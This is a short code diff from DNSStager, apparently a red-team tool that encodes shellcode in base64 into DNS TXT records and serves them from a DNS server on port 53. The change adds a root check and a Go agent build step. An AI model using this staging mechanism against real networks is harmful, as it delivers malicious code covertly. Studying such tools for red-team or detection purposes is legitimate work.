@@ -8,6 +8,8 @@ from core.functions import *
 from core.builders import *
 
 
+check_root()
+
 parser = argparse.ArgumentParser(description='DNSStager main parser')
 parser.add_argument(
     '--domain',
@@ -149,7 +151,7 @@ if payload in dnsstager_payloads:
         # call golang txt
         encoded_shellcode = encode_shellcode_base64(shellcode)
         ZONES = generate_zone_TXT(domain, encoded_shellcode, prefix)
-        print(ZONES)
+        build_golang_base64_txt(domain_to_use, prefix, sleep, output, arch)
 
 else:
     print_error("Payload not found, please use --payloads to list all payloads")
@@ -160,5 +162,6 @@ print_success("Starting DNS server .. ")
 resolver = Resolver(ZONES)
 
 server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
+print_success("Server started!")
 
 server.start()
